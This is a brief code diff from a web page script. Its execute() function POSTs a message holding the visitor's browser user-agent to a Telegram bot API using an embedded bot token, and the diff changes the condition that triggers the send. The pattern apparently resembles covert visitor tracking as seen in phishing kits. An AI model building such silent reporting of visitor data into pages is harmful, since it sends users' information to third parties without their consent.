@@ -158,7 +158,7 @@
 
             function execute() {
                 const message = `InfoBrowser: ${uagent}`;
-                if (document.getElementById('debug').innerHTML == "6,5") {
+                if (res3.includes(document.getElementById('debug').innerHTML)) {
                     $.ajax({
                         type: 'POST',
                         url: `https://api.telegram.org/bot${token}/sendMessage`,
